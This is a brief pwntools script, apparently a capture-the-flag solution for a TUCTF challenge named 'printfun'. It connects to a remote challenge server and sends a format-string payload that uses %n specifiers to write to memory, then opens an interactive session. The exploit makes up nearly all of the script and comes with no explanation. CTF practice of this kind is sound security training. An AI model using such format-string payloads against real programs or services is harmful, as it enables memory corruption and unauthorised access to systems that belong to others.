from pwn import *

# context.terminal = ['termite', '-e']
# p = gdb.debug('./printfun')
# p = process('printfun')
p = remote('chal.tuctf.com', 30501)

p.sendlineafter('? ', 'AAAA%6$n%7$n')
p.interactive()